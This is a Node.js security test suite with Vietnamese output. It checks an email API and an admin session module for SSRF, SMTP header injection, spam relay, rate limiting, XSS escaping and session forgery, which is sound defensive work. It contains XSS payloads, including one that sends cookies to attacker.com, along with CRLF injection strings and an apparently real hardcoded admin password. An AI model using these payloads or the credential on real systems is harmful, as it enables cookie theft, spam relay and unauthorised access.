const assert = require('assert');
const sendEmailHandler = require('./api/send-email.js');

console.log('🛡️  BẮT ĐẦU CHẠY BỘ KIỂM TRA BẢO MẬT TOÀN DIỆN (SECURITY AUDIT TEST SUITE)\n');

let passedTests = 0;
let totalTests = 0;

function runTest(testName, fn) {
    totalTests++;
    try {
        fn();
        console.log(`  ✅ [PASS] ${testName}`);
        passedTests++;
    } catch (err) {
        console.error(`  ❌ [FAIL] ${testName}: ${err.message}`);
    }
}

async function runAsyncTest(testName, fn) {
    totalTests++;
    try {
        await fn();
        console.log(`  ✅ [PASS] ${testName}`);
        passedTests++;
    } catch (err) {
        console.error(`  ❌ [FAIL] ${testName}: ${err.message}`);
    }
}

// Mock HTTP Response
function createMockRes() {
    return {
        statusCode: 200,
        headers: {},
        data: null,
        setHeader(k, v) { this.headers[k] = v; },
        status(code) { this.statusCode = code; return this; },
        json(payload) { this.data = payload; return this; },
        end() { return this; }
    };
}

(async () => {
    // ------------------------------------------------------------------------
    // TEST 1: Anti-SSRF Defense on /api/send-email
    // ------------------------------------------------------------------------
    console.log('--- PHẦN 1: KIỂM TRA PHÒNG CHỐNG SSRF TRÊN API SEND-EMAIL ---');

    const ssrfHosts = ['localhost', '127.0.0.1', '0.0.0.0', '192.168.1.1', '10.0.0.1', '169.254.169.254', 'metadata.google.internal'];

    for (const host of ssrfHosts) {
        await runAsyncTest(`Chặn máy chủ nội bộ cấm SSRF: "${host}"`, async () => {
            const req = {
                method: 'POST',
                headers: { 'x-forwarded-for': '203.0.113.195' },
                body: {
                    action: 'verify',
                    smtp: { host: host, port: 465, user: 'admin@thuhien.online', pass: 'secret' }
                }
            };
            const res = createMockRes();
            await sendEmailHandler(req, res);
            assert.strictEqual(res.statusCode, 403, `Cần trả về 403 Forbidden cho host cấm ${host}`);
            assert.strictEqual(res.data.success, false);
            assert(res.data.error.includes('Anti-SSRF'));
        });
    }

    // ------------------------------------------------------------------------
    // TEST 2: Header Injection Prevention on Email API
    // ------------------------------------------------------------------------
    console.log('\n--- PHẦN 2: KIỂM TRA CHỐNG TẤN CÔNG SMTP HEADER INJECTION ---');

    await runAsyncTest('Chặn email có ký tự xuống dòng CRLF injection', async () => {
        const req = {
            method: 'POST',
            headers: { 'x-forwarded-for': '203.0.113.196' },
            body: {
                action: 'send',
                smtp: { host: 'smtp.gmail.com', port: 465, user: 'admin@thuhien.online', pass: 'secret' },
                to: 'victim@gmail.com\r\nBcc: spammer@attacker.com',
                subject: 'Normal Subject\r\nBcc: spam2@attacker.com'
            }
        };
        const res = createMockRes();
        await sendEmailHandler(req, res);
        // Recipient has invalid characters or sanitized recipient fails regex
        assert(res.statusCode === 400 || res.statusCode === 500);
        assert.strictEqual(res.data.success, false);
    });

    // ------------------------------------------------------------------------
    // TEST 3: Mass Spam Relay Prevention (> 5 recipients)
    // ------------------------------------------------------------------------
    console.log('\n--- PHẦN 3: KIỂM TRA GIỚI HẠN RECIPIENTS CHỐNG SPAM RELAY ---');

    await runAsyncTest('Từ chối gửi hơn 5 người nhận cùng lúc', async () => {
        const req = {
            method: 'POST',
            headers: { 'x-forwarded-for': '203.0.113.197' },
            body: {
                action: 'send',
                smtp: { host: 'smtp.gmail.com', port: 465, user: 'admin@thuhien.online', pass: 'secret' },
                to: ['a@a.com', 'b@b.com', 'c@c.com', 'd@d.com', 'e@e.com', 'f@f.com']
            }
        };
        const res = createMockRes();
        await sendEmailHandler(req, res);
        assert.strictEqual(res.statusCode, 400);
        assert.strictEqual(res.data.success, false);
        assert(res.data.error.includes('Giới hạn tối đa 5 người nhận'));
    });

    // ------------------------------------------------------------------------
    // TEST 4: Rate Limiter on API Send-Email
    // ------------------------------------------------------------------------
    console.log('\n--- PHẦN 4: KIỂM TRA RATE LIMITING CHỐNG BRUTE-FORCE VÀ DDOS ---');

    await runAsyncTest('Kích hoạt Rate Limit 429 sau quá 20 request / phút từ cùng 1 IP', async () => {
        const testIp = '198.51.100.77';
        let hitRateLimit = false;

        for (let i = 0; i < 25; i++) {
            const req = {
                method: 'POST',
                headers: { 'x-forwarded-for': testIp },
                body: { action: 'verify', smtp: { host: 'smtp.gmail.com', port: 465, user: 'admin@thuhien.online', pass: 'p' } }
            };
            const res = createMockRes();
            await sendEmailHandler(req, res);
            if (res.statusCode === 429) {
                hitRateLimit = true;
                assert.strictEqual(res.data.code, 'RATE_LIMITED');
                break;
            }
        }
        assert.strictEqual(hitRateLimit, true, 'Rate limiter phải kích hoạt khi gửi quá ngưỡng!');
    });

    // ------------------------------------------------------------------------
    // TEST 5: XSS Sanitization Function
    // ------------------------------------------------------------------------
    console.log('\n--- PHẦN 5: KIỂM TRA PHÒNG CHỐNG XSS (CROSS-SITE SCRIPTING) ---');

    function escapeHtml(str) {
        if (str === null || str === undefined) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
    }

    const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=fetch("https://attacker.com/steal?cookie="+document.cookie)>',
        '"><svg onload=alert(1)>',
        "javascript:alert('pwned')",
        '\' onfocus=\'alert(1)\'',
        '<iframe src="https://evil.com"></iframe>'
    ];

    for (const payload of xssPayloads) {
        runTest(`Mã hóa an toàn payload XSS: ${payload.substring(0, 30)}...`, () => {
            const sanitized = escapeHtml(payload);
            assert(!sanitized.includes('<script>'), 'Không được chứa thẻ <script>');
            assert(!sanitized.includes('<img'), 'Không được chứa thẻ <img');
            assert(!sanitized.includes('<iframe'), 'Không được chứa thẻ <iframe');
            assert(!sanitized.includes('<svg'), 'Không được chứa thẻ <svg');
            assert(!sanitized.includes('"'), 'Không được chứa dấu ngoặc kép trần');
        });
    }

    // ------------------------------------------------------------------------
    // TEST 6: Session Tampering & Signature Verification
    // ------------------------------------------------------------------------
    console.log('\n--- PHẦN 6: KIỂM TRA CHỐNG LỖ HỔNG SESSION TAMPERING & BYPASS ---');

    // Simulate browser storage
    const mockStorage = new Map();
    global.sessionStorage = {
        getItem: (k) => mockStorage.get(k) || null,
        setItem: (k, v) => mockStorage.set(k, String(v)),
        removeItem: (k) => mockStorage.delete(k)
    };
    global.localStorage = {
        getItem: (k) => mockStorage.get(k) || null,
        setItem: (k, v) => mockStorage.set(k, String(v)),
        removeItem: (k) => mockStorage.delete(k)
    };

    // Load db.js
    const dbModule = require('./assets/js/db.js');

    runTest('Từ chối giả mạo flag thuhien_admin_auth = "true" trong Console', () => {
        mockStorage.clear();
        mockStorage.set('thuhien_admin_auth', 'true'); // Fake attempt
        const auth = dbModule.isAdminAuthenticated();
        assert.strictEqual(auth, false, 'Không có session token chữ ký thì phải trả về FALSE!');
        assert.strictEqual(mockStorage.get('thuhien_admin_auth'), undefined, 'Flag giả mạo phải bị xóa sạch!');
    });

    runTest('Từ chối session giả mạo signature sai', () => {
        mockStorage.clear();
        mockStorage.set('thuhien_admin_session', JSON.stringify({
            username: 'admin',
            loginTime: Date.now(),
            expiresAt: Date.now() + 3600000,
            signature: 'fake_forged_signature_123456789'
        }));
        const auth = dbModule.isAdminAuthenticated();
        assert.strictEqual(auth, false, 'Chữ ký sai phải bị từ chối!');
    });

    runTest('Từ chối session đã hết hạn (expired session)', () => {
        mockStorage.clear();
        mockStorage.set('thuhien_admin_session', JSON.stringify({
            username: 'admin',
            loginTime: Date.now() - 50000000,
            expiresAt: Date.now() - 1000, // expired
            signature: 'abc'
        }));
        const auth = dbModule.isAdminAuthenticated();
        assert.strictEqual(auth, false, 'Session hết hạn phải bị từ chối!');
    });

    runTest('Đăng nhập chính xác tạo session có chữ ký hợp lệ được chấp nhận', () => {
        mockStorage.clear();
        const loginRes = dbModule.verifyAdminLogin('admin', 'thuhien2026', '', '10', 10, 1500);
        assert.strictEqual(loginRes.success, true);
        const auth = dbModule.isAdminAuthenticated();
        assert.strictEqual(auth, true, 'Đăng nhập mật khẩu đúng phải có auth = true');
        const session = JSON.parse(mockStorage.get('thuhien_admin_session'));
        assert(session.signature && session.signature.length === 64, 'Phải có chữ ký SHA-256 64 ký tự!');
    });

    runTest('Đăng xuất xóa sạch toàn bộ session token', () => {
        dbModule.clearAdminSession();
        assert.strictEqual(dbModule.isAdminAuthenticated(), false);
        assert.strictEqual(mockStorage.get('thuhien_admin_session'), undefined);
    });

    console.log(`\n=======================================================`);
    console.log(`📊 TỔNG KẾT: ĐÃ VƯỢT QUA ${passedTests}/${totalTests} BÀI KIỂM TRA BẢO MẬT THÀNH CÔNG!`);
    console.log(`=======================================================\n`);
})();
